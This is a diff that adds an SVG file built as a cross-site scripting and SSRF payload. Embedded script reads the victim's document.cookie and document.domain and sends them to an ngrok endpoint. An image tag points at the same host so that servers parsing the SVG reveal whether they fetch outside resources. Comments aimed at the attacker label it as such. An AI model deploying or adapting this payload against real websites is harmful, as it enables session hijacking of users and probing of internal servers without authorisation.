@@ -1,0 +1,14 @@
+<?xml version="1.0" standalone="yes"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <!-- XSS: fires in browser context and notifies your ngrok endpoint -->
+  <script><![CDATA[
+    try {
+      new Image().src = 'https://3f5b31f523a6.ngrok-free.app/xss?c=' + encodeURIComponent(document.cookie);
+      fetch('https://3f5b31f523a6.ngrok-free.app/xss_fetch?d=' + encodeURIComponent(document.domain)).catch(()=>{});
+    } catch (e) {}
+  ]]></script>
+
+  <!-- SSRF hint for backends that fetch external resources when parsing SVG -->
+  <image href="https://3f5b31f523a6.ngrok-free.app/ssrf-test" xlink:href="https://3f5b31f523a6.ngrok-free.app/ssrf-test"
+         xmlns:xlink="http://www.w3.org/1999/xlink" width="1" height="1"/>
+</svg>
